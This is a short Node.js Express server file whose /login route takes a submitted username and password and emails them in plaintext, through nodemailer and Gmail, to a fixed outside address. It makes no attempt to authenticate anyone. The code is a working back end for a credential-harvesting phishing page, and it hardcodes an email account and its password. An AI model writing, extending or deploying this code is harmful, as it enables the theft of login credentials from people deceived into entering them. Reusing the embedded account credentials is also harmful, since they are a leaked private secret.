const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Setup email transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail', // or other email service
        auth: {
            user: 'shareefmoosa135@gmail.com', // Replace with your email address
            pass: 'ajmalajmal135' // Replace with your email password
        }
    });
    
    // Email options
    const mailOptions = {
        from: 'ajmal.aj.applications@gmail.com', // Replace with your email address
        to: 'shareefmoosa135@gmail.com', // Replace with your email address
        subject: 'New Login Attempt',
        text: `Username: ${username}\nPassword: ${password}`
    };
    
    // Send email
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.send('Failed to send email.');
        }
        res.send('Login details sent successfully.');
    });
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});
